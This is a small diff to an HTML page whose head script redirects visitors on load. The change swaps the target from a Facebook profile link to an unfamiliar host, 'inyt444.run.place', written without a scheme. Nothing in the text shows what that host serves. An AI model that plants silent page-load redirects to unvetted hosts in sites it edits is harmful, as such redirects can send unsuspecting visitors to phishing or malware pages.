@@ -2,7 +2,7 @@
 <html>
 <head>
   <script>
-    window.location.href = "https://www.facebook.com/abusufiyanmridhashayan";
+    window.location.href = "inyt444.run.place";
   </script>
 </head>
 <body>
